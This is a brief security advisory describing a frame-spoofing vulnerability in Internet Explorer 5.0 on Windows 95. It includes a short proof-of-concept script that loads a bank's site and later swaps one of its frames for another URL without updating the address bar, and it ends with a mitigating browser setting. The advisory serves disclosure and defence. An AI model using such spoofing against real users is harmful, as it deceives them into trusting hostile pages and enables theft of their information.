Description:

Internet Explorer 5.0 under Windows 95 (guess other versions are
affected) with its
default security settings allows frame spoofing. The problem is setting
the location of a frame to an arbitrary URL without updating the address
bar.
This vulnerability allows misleading the user he is browsing a trusted
site, while in fact he may be browsing a hostile site which might be
stealing information.

The code is:
----------------------------------------------------------------------------------------
<SCRIPT>
b=window.open("http://www.citybank.com");
function g()
{
b.frames[2].location="http://www.yahoo.com";
}
setTimeout("g()",6000);
</SCRIPT>
----------------------------------------------------------------------------------------


Solution: Set "Navigate sub-frames across different domains" option to
Disable
